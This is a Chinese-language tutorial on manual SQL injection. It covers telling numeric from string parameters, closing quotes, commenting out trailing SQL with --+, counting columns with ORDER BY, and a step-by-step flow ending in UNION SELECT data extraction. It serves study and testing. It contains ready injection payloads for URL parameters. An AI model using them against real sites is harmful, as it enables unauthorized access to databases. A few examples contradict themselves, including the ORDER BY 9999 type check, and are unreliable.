## 一句话概括

SQL 注入的第一个动作不是写 payload，而是判断参数在 SQL 里被什么包围：没有被引号包住的是数字型，直接拼就行；被引号包住的是字符型，必须先用一个 `'` 闭合掉前面的引号，否则你的代码会被当成字符串内容，永远执行不到。

## 原理

### 1. 两种拼接方式，决定了要不要闭合

服务端把用户输入拼进 SQL 时，有两种写法：

```sql
-- 数字型：参数外面没有引号
SELECT * FROM users WHERE id = 用户输入

-- 字符型：参数外面有引号
SELECT * FROM users WHERE name = '用户输入'
```

- 数字型里，我们输入的 `1 or 1=1` 直接变成 SQL 语法 `WHERE id = 1 or 1=1`，衔接自然，无需闭合。
- 字符型里，输入的 `admin' or '1'='1` 如果不先补一个引号，SQL 会变成 `WHERE name = '1 and 1=2'`，整段输入都被关在字符串里，`and`、`or` 都只是普通文字。

![数字型与字符型的闭合差异](../_assets/sql-string-vs-numeric-injection.svg)

### 2. 为什么字符型里 `and 1=1` 和 `and 1=2` 都"正常显示"

这是最容易判断错误的地方。假设原 SQL 是 `WHERE id = '1 and 1=2'`：

- MySQL 在把字符串和数字比较时，会从字符串开头提取数字，遇到非数字字符就停；
- `'1 and 1=1'` → 取出 `1`；
- `'1 and 1=2'` → 也取出 `1`。

所以两条查询实际都在查 `id = 1`，回显当然一样。判据是：`1` 和 `1=2` 回显不同即数字型；回显相同即字符型，说明 payload 被困在字符串里了。

### 3. 闭合的本质

闭合就是在参数值的末尾补上原 SQL 的结束引号，让 SQL 的字符串提前结束，之后的内容就变成了可执行的 SQL 代码：

```sql
-- 输入 1' UNION SELECT ...
-- SQL 提前结束字符串，payload 逃出字符串，成为独立语法
SELECT * FROM users WHERE id = '1' UNION SELECT ...  -- ' AND status=1 ...
```

### 4. 为什么闭合之后还要注释

真实业务里的 SQL 往往不止一个 WHERE 条件：

```sql
SELECT * FROM users WHERE id = '[输入]' AND status = 1 ORDER BY name LIMIT 10;
```

如果只闭合不注释，payload 后面会紧跟着原 SQL 的剩余部分，造成语法错误：

```sql
SELECT * FROM users WHERE id = '1' UNION SELECT 1,2,3' AND status = 1 ORDER BY name LIMIT 10;
--                                                 ↑ 多出来的引号导致语法错误
```

加上注释符 `--+` 之后：

```sql
SELECT * FROM users WHERE id = '1' UNION SELECT 1,2,3-- ' AND status = 1 ...
-- 数据库实际执行：SELECT * FROM users WHERE id = '1' UNION SELECT 1,2,3
```

`--` 是 SQL 注释符，后面必须跟一个空白字符才生效；`+` 在 URL 里会被解码成空格，所以 `--+` 是注释符加 URL 里的空格。

## 判断类型：三种可用手法

| 手法 | 数字型表现 | 字符型表现 |
|---|---|---|
| `?id=1 and 1=1` / `?id=1 and 1=2` | 一个正常、一个无结果 | 两个都正常（被当字符串，取前缀数字 1） |
| `?id=1' and '1'='1` / `?id=1' and '1'='2'` | 直接报错 | 一真一假，回显不同 |
| `?id=1 and sleep(5)` / `?id=1' and sleep(5)` | 不带引号的延迟 | 带引号的延迟 |

判据口诀：`1=1` 正常、`1=2` 无显示是数字型；两个都正常是字符型。

## 判断闭合方式：先制造错误，再修复

`'` 不是唯一的闭合符，实际环境里还可能是 `"`、`')`、`")`、`'))`、`'}` 等。

```text
步骤1：先制造错误
?id=1'      → 报错，说明可能存在单引号闭合
?id=1")     → 报错，说明可能存在 双引号+括号 闭合

步骤2：再用注释符修复
?id=1'--+   → 从错误恢复正常 → 确认是单引号闭合
?id=1")--+  → 从错误恢复正常 → 确认是 双引号+括号 闭合
```

常见闭合符一览：

| 闭合符 | 对应原 SQL 形态 |
|---|---|
| `'` | `WHERE id = '[输入]'` |
| `"` | `WHERE id = "[输入]"` |
| `')` | `WHERE id = ('[输入]')` |
| `")` | `WHERE id = ("[输入]")` |
| `'))` | 多层括号嵌套 |

## 闭合之后想注入：先数清楚有几列

闭合、注释都通了之后，下一步是让别人把数据"吐"出来。最常用的是 `UNION`，但有硬性前提：

```sql
SELECT * FROM users WHERE id = '1' UNION SELECT ...
```

UNION 前后两个 SELECT 的列数必须一致，否则直接报错（`The used SELECT statements have a different number of columns`）。所以必须先探测列数：

```sql
?id=1' order by 1 --+   (正常)
?id=1' order by 2 --+   (正常)
?id=1' order by 3 --+   (正常)
?id=1' order by 4 --+   (错误)  → 一共 3 列
```

也可以直接上 `union select` 试：

```sql
?id=1' order by 9999 --+   (错误) → 字符型（引号被当字符串内容）
?id=1 order by 9999 --+    (错误) → 数字型需要进一步确认
```

之所以不挑小列号逐个试，而是用 `order by 9999`：一个大到不可能存在的列号能一次制造出明确报错，快速区分类型。99.9% 的表不会真有 9999 个字段。

## 完整判断与利用流程

```text
1. 基础探测：?id=1                    → 正常
2. 语法触发：?id=1'                   → 报错（说明存在引号上下文）
3. 注释修复：?id=1' --+               → 恢复正常（确认闭合符有效）
4. 布尔验证：?id=1' and '1'='1' --+   → 正常
5. 布尔对比：?id=1' and '1'='2' --+   → 无结果（确认能控制查询逻辑）
6. 判断列数：?id=1' order by N --+    → 找到列数
7. 定位回显：?id=-1' union select 1,2,3 --+
8. 信息收集与取数
```

第 4、5 步是关键分水岭：只有第 4 步通过，说明语法对了但不知道能不能控制查询逻辑；补上第 5 步的对比，才能确认布尔开关存在，否则可能是白忙一场。

## 一句话总结

先判断包围符（数字型不用闭合，字符型必须闭合），再用注释符砍掉尾巴，再用 `order by` 数清列数，最后才能上 UNION 取数据。

## 注意事项

- `--+` 里的 `+` 是 URL 编码出来的空格。MySQL 要求 `--` 后面必须跟空白符才是注释；如果直接写 `--`，在某些客户端里不生效。
- 闭合符不唯一：不要只试 `'`，`"`、`)`、`"` + `)` 的组合都可能。常见测试序列是 `'` → `"` → `')` → `")` → `'))` → `'}`。
- 字符型里 payload 会被"取前缀数字"：`'1 and 1=2'` 转成数字是 `1`，所以看起来"条件没生效"。这不是注入失败，而是 payload 没闭合。
- `order by` 报错只说明列号超了，不代表类型；换用小列号逐个加，找到第一个报错的 N，列数就是 N-1。
- 判断列数也可以用 `group by`：`SELECT username FROM users GROUP BY 2;` 会报错，因为 `username` 只有一列，没有第二列可分组。
